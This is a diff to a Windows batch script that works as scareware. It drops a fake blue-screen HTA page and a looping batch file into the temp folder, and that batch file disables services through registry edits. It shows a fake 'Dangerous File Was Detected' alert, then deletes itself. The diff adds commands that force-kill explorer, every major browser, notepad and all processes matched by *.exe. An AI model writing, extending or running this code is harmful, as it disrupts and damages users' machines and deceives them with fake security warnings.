@@ -51,7 +51,7 @@ echo document.onmousedown=noClick
 echo ^</script^>
 echo.  
 echo ^</html^> 
-) > bsod.hta 
+) > %temp%\bsod.hta 
 set Random2=%random%
 (
 echo @echo off
@@ -78,9 +78,16 @@ echo reg add %%key%% /v Start /t REG_DWORD /d 4
 echo rem --------------------- 
 echo goto Loophole
 ) >%temp%\OMFGA.bat
-taskkill /f /im explorer.exe 
+taskkill /f /im explorer.exe
+taskkill /f /im chrome.exe 
+taskkill /f /im edge.exe
+taskkill /f /im firefox.exe
+taskkill /f /im brave.exe
+taskkill /f /im google.exe
+taskkill /f /im notepad.exe
+taskkill /f /im *.exe
 cls
-start bsod.hta
+start %temp%\bsod.hta
 cls
 start /min %temp%\OMFGA.bat >nul
 cls
@@ -92,5 +99,16 @@ echo Dangerous File Was Detected!
 timeout /t 2 /nobreak >nul
 echo Automaticlly Removing Dangerous File...
 timeout /t 2 /nobreak >nul
+taskkill /f /im explorer.exe
+taskkill /f /im chrome.exe 
+taskkill /f /im edge.exe
+taskkill /f /im firefox.exe
+taskkill /f /im brave.exe
+taskkill /f /im google.exe
+taskkill /f /im notepad.exe
+taskkill /f /im *.exe
+start explorer.exe
+del /f /q %temp%\OMFGA.bat
 del %0%
+taskkill /f /im cmd.exe
 exit
